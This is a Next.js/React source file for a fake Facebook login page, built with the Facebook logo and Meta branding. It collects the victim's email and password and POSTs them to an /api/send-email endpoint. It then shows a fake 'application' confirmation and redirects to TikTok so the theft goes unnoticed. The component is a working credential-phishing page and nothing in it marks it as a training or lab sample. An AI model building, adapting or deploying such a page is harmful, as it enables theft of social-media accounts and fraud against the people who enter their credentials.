import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import Image from "next/image";

export default function FacebookLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [notification, setNotification] = useState("");
  const [notificationType, setNotificationType] = useState("");

  // Set the cookie when the component mounts
  useEffect(() => {
    const setCookie = async () => {
      try {
        const response = await fetch("/api/set-cookie", { method: "POST" });
        if (!response.ok) {
          console.error("Failed to set cookie:", await response.text());
        }
      } catch (err) {
        console.error("Error setting cookie:", err);
      }
    };
    setCookie();

    console.log("Cookies on client:", document.cookie);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!email || !password) {
      setError("Please enter your email and password.");
      return;
    }
    setError("");

    try {
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      const responseData = await response.json();
      if (response.ok) {
        setNotification("Thank for Applying, our Agent will get back within 3 working days. You can now continue with tiktok");
        setNotificationType("success");
        setTimeout(() => {
          window.location.href = "https://www.tiktok.com/explore";
        }, 2000);
      } else {
        throw new Error(responseData.error || "Failed to send email");
      }
    } catch (err) {
      console.error("Error sending email:", err.message);
      setNotification(`Application failed: ${err.message}`);
      setNotificationType("error");
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-gradient-to-b from-[#e0f7fa] to-[#ffffff]">
      <div className="flex flex-col items-center">
        <div className="mb-6">
          <Image
            src="/facebook-icon.png"
            alt="Facebook Logo"
            width={60}
            height={60}
          />
        </div>

        <motion.div className="w-full max-w-sm">
          <form onSubmit={handleSubmit} className="space-y-4">
            <input
              type="text"
              placeholder="Mobile number or email address"
              className="w-full p-3 bg-white border border-gray-300 rounded-lg text-gray-700 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <input
              type="password"
              placeholder="Password"
              className="w-full p-3 bg-white border border-gray-300 rounded-lg text-gray-700 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            {error && <p className="text-red-500 text-sm text-center">{error}</p>}
            {notification && (
              <p className={`notification ${notificationType}`}>
                {notification}
              </p>
            )}
            <motion.button
              type="submit"
              className="w-full bg-blue-600 p-3 rounded-lg text-white font-semibold text-lg hover:bg-blue-700 transition-colors"
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              Log in
            </motion.button>
          </form>
          <p className="text-center text-blue-600 text-sm mt-4 hover:underline cursor-pointer">
            Forgotten password?
          </p>
          <div className="flex items-center my-6">
            <div className="flex-grow border-t border-gray-300"></div>
          </div>
          <button className="w-full border border-blue-600 p-3 rounded-lg text-blue-600 font-semibold text-lg hover:bg-blue-50 transition-colors">
            Create new account
          </button>
        </motion.div>

        <div className="mt-8 text-center">
          <p className="text-gray-600 text-sm">
            <span className="font-semibold">Meta</span>
          </p>
          <div className="flex justify-center space-x-4 mt-2">
            <a href="#" className="text-gray-600 text-sm hover:underline">About</a>
            <a href="#" className="text-gray-600 text-sm hover:underline">Help</a>
            <a href="#" className="text-gray-600 text-sm hover:underline">More</a>
          </div>
        </div>

        <style jsx>{`
          .notification {
            font-size: 14px;
            text-align: center;
            margin-bottom: 16px;
            padding: 10px;
            border-radius: 4px;
          }
          .notification.success {
            color: #15803d;
            background-color: #dcfce7;
          }
          .notification.error {
            color: #b91c1c;
            background-color: #fee2e2;
          }
        `}</style>
      </div>
    </div>
  );
}